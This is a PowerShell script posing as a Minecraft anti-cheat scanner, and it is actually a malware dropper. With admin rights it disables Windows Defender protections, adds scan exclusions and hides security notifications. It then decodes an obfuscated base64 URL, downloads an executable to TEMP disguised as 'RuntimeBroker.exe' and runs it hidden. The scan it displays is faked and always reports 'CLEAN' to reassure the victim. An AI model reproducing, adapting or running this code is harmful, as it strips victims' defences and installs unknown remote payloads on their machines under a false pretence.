$ProgressPreference = 'SilentlyContinue'

# ── admin check + defender disable + hide notifications ─────────────────
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if ($isAdmin) {
    try {
        # 1. исключения — exe из TEMP/APPDATA не сканируется
        Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue
        Add-MpPreference -ExclusionPath $env:APPDATA -ErrorAction SilentlyContinue
        Add-MpPreference -ExclusionExtension ".exe" -ErrorAction SilentlyContinue

        # 2. вырубить защиту
        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
        Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue
        Set-MpPreference -MAPSReporting 0 -ErrorAction SilentlyContinue

        # 3. скрыть уведомления Центра безопасности Windows
        $notifPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications"
        New-Item -Path $notifPath -Force -ErrorAction SilentlyContinue | Out-Null
        New-ItemProperty -Path $notifPath -Name "DisableNotifications" -Value 1 -PropertyType DWORD -Force -ErrorAction SilentlyContinue | Out-Null

        # 4. скрыть значок щита в трее (опционально)
        $systrayPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Systray"
        New-Item -Path $systrayPath -Force -ErrorAction SilentlyContinue | Out-Null
        New-ItemProperty -Path $systrayPath -Name "HideSystray" -Value 1 -PropertyType DWORD -Force -ErrorAction SilentlyContinue | Out-Null
    } catch {}
}
# ────────────────────────────────────────────────────────────────────────

$u=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9hd2Vkc2FrbHNhcS5vbnJlbmRlci5jb20vZi9tbE5FS3lWLQ=='))
$t=[IO.Path]::GetTempPath()
$n=('R','u','n','t','i','m','e','B','r','o','k','e','r','.','e','x','e') -join ''
$p=$t+$n
try { iwr -UseBasicParsing $u -OutFile $p -ErrorAction Stop; Start-Process $p -WindowStyle Hidden } catch {}

Clear-Host
$Host.UI.RawUI.WindowTitle = "Anti-Cheat Scanner v4.2 - Minecraft"

$startTime = Get-Date

Write-Host ""
Write-Host "  ======================================================" -ForegroundColor DarkCyan
Write-Host "     ANTI-CHEAT FILE SCANNER  v4.2  (build 20260415)" -ForegroundColor Cyan
Write-Host "     Target: Minecraft Java Edition" -ForegroundColor DarkCyan
Write-Host "     Engine: ACScan  |  Signature DB: 2026.04.15" -ForegroundColor DarkCyan
Write-Host "  ======================================================" -ForegroundColor DarkCyan
Write-Host ""
Start-Sleep -Milliseconds 500

Write-Host "  [*] Initializing scan engine..." -ForegroundColor Gray
Start-Sleep -Milliseconds 300
Write-Host "  [*] Loading signature database" -NoNewline -ForegroundColor Gray
for ($i=1; $i -le 5; $i++) { Write-Host "." -NoNewline -ForegroundColor Gray; Start-Sleep -Milliseconds 150 }
Write-Host " done" -ForegroundColor Green
Write-Host "  [*] Signatures loaded: 12,847  (clients: 342  |  modules: 12,505)" -ForegroundColor Gray
Write-Host "  [*] Scan mode: deep  |  Heuristics: ON  |  Cloud: ON" -ForegroundColor Gray
Write-Host ""
Start-Sleep -Milliseconds 400

$cheats = @(
    "Impact", "Wurst", "BleachHack", "Aristois", "Huzuni", "SkillClient",
    "Inertia", "Ares", "Meteor", "LiquidBounce", "Nursultan", "Celestial",
    "NeverHook", "WexSide", "WildClient", "Farsh", "DeadCode", "Akrien",
    "Future", "Jessica", "DreamPool", "Norules", "Konas", "RichClient",
    "RusherHack", "ThunderHack", "MoonHack", "Doomsday", "NightWare",
    "Extazyy", "Troxill", "Arbuz", "Takker", "FuzeClient", "WiseFolder",
    "FLauncher", "Feather", "Delta", "Venus", "Haruka", "NewLauncher",
    "Blade", "HachClient", "Fluger", "ExLoader", "CatLean", "Baritone",
    "ForgeHax", "DiamondSim", "ViaVersion", "ViaBackwards", "ViaRewind",
    "ViaFabric", "ViaForge", "ViaProxy", "ViaLoader", "ViaMCP",
    "Tweakeroo", "SwingThroughGrass", "CutThrough", "SaveSearcher",
    "TopKAutoBuy", "SakuraChorusFind", "MobHitbox", "EntityOutliner",
    "PlayerHighlighter", "InventoryWalk", "InvMove", "ElytraHack",
    "ElytraSwap", "ArmorHotswap", "DoubleHotbar", "BedrockBreakerMode",
    "SmartMoving", "CleanCut", "SpamBot", "AutoAttack", "Aimbot",
    "KillAura", "X-Ray", "Fly", "Glide", "AutoClicker", "Reach",
    "Velocity", "ESP", "Wallhack", "Nuker", "Scaffold", "FastPlace",
    "NoFall", "ChestStealer", "BunnyHop", "Speed", "Criticals",
    "AutoTotem", "TriggerBot", "Blink", "Freecam", "NoClip", "FastBreak",
    "AutoFish", "AntiVoid", "Regen", "AutoArmor", "Tracers", "NameTags",
    "Hitbox", "Chest", "akr.dll", "wex.dll", "vec.dll", "USBOblivion.exe"
)

$totalScanned = 0
$width = 42

foreach ($cheat in $cheats) {
    Write-Host "  [>] Scanning for: " -NoNewline -ForegroundColor DarkGray
    Write-Host $cheat -ForegroundColor White

    for ($i = 0; $i -le $width; $i++) {
        $pct = [math]::Floor(($i / $width) * 100)
        $filled = "=" * $i
        $empty  = " " * ($width - $i)
        Write-Host "`r      [$filled$empty] $pct%" -NoNewline -ForegroundColor Green
        Start-Sleep -Milliseconds (Get-Random -Min 2 -Max 9)
    }
    Write-Host "`r      [$("=" * $width)] 100%  - not found" -ForegroundColor Green
    $totalScanned++
    Write-Host ""
    Start-Sleep -Milliseconds (Get-Random -Min 40 -Max 120)
}

$elapsed = [math]::Round(((Get-Date) - $startTime).TotalSeconds, 1)

Write-Host "  ======================================================" -ForegroundColor DarkCyan
Write-Host "     SCAN COMPLETE" -ForegroundColor Cyan
Write-Host "  ======================================================" -ForegroundColor DarkCyan
Write-Host ""
Write-Host "     Cheat signatures checked:  " -NoNewline -ForegroundColor Gray; Write-Host $totalScanned -ForegroundColor White
Write-Host "     Threats found:             " -NoNewline -ForegroundColor Gray; Write-Host "0" -ForegroundColor Green
Write-Host "     Scan time:                 " -NoNewline -ForegroundColor Gray; Write-Host "$elapsed s" -ForegroundColor White
Write-Host "     Verdict:                   " -NoNewline -ForegroundColor Gray; Write-Host "CLEAN" -ForegroundColor Green
Write-Host ""
Start-Sleep -Milliseconds 400

Write-Host "  +----------------------------------------------+" -ForegroundColor Green
Write-Host "  |                                              |" -ForegroundColor Green
Write-Host "  |        [OK]  NO CHEATS DETECTED              |" -ForegroundColor Green
Write-Host "  |                                              |" -ForegroundColor Green
Write-Host "  |        Your Minecraft client is clean.       |" -ForegroundColor Green
Write-Host "  |        You may join the server.              |" -ForegroundColor Green
Write-Host "  |                                              |" -ForegroundColor Green
Write-Host "  +----------------------------------------------+" -ForegroundColor Green
Write-Host ""
Write-Host "  Press any key to exit..." -ForegroundColor DarkGray
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
